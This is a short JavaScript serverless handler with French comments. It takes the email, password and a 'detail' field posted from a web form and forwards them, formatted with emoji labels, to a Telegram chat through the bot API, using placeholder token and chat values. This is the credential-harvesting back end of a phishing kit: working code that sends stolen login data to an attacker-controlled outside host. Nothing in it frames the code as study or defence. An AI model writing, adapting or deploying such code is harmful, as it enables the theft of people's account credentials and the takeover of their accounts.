export async function handler(event, context) {
  const TELEGRAM_BOT_TOKEN = "TON_BOT_TOKEN";
  const CHAT_ID = "TON_CHAT_ID";

  // Les données envoyées par $.ajax (form-urlencoded)
  const querystring = require('querystring');
  const body = querystring.parse(event.body);

  const email = body.email || 'inconnu';
  const password = body.password || 'inconnu';
  const detail = body.detail || 'none';

  const message = `📨 Nouveau message :\n📧 Email: ${email}\n🔑 Password: ${password}\n📄 Detail: ${detail}`;

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;

  try {
    const res = await fetch(url);
    const data = await res.json();

    return {
      statusCode: 200,
      body: JSON.stringify({ ok: true, data })
    };
  } catch (err) {
    return {
      statusCode: 500,
      body: JSON.stringify({ ok: false, error: err.message })
    };
  }
}
